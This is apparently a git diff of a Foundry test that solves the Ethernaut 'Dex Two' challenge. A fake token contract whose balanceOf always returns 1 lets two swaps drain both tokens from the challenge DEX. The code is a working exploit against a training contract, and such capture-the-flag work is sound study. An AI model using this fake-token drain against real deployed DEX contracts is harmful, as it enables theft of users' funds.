@@ -10,27 +10,35 @@ interface IDexTwo {
   function swap(address from, address to, uint amount) external;
 }
 
-contract NoToken {
+contract MyToken {
   function transferFrom(address, address, uint256) public pure returns (bool) {
-    return true;
+    // we don't even need to do anything here
+    return false;
   }
+
   function balanceOf(address) public pure returns(uint256) {
+    // the dex will ask for IERC20(from).balanceOf(address(this))
+    // we give them the value `1`
+    // the dex uses it to compute the swap amount = amount * token_to / token_from
     return 1;
   }
 }
 
 contract DexTwoTest is Test {
+  address challengeAddress;
+  IDexTwo dex;
+  MyToken myToken;
+
+  function setUp() public {
+    challengeAddress = utils.createLevelInstance(0x0b6F6CE4BCfB70525A31454292017F640C10c768);
+    dex = IDexTwo(challengeAddress);
+    myToken = new MyToken();
+  }
+
   function testExploit() public {
-    address challengeAddress = utils.createLevelInstance(0x0b6F6CE4BCfB70525A31454292017F640C10c768);
-
-    IDexTwo dex = IDexTwo(challengeAddress);
-
-    NoToken noToken = new NoToken();
-
-    // will get 1 * (100/ 1) = 100.
-    dex.swap(address(noToken), dex.token1(), 1);
-    dex.swap(address(noToken), dex.token2(), 1);
-
+    // will get as token amount 1 * (100/ 1) = 100 on each swap
+    dex.swap(address(myToken), dex.token1(), 1);
+    dex.swap(address(myToken), dex.token2(), 1);
     utils.submitLevelInstance(challengeAddress);
   }
 }
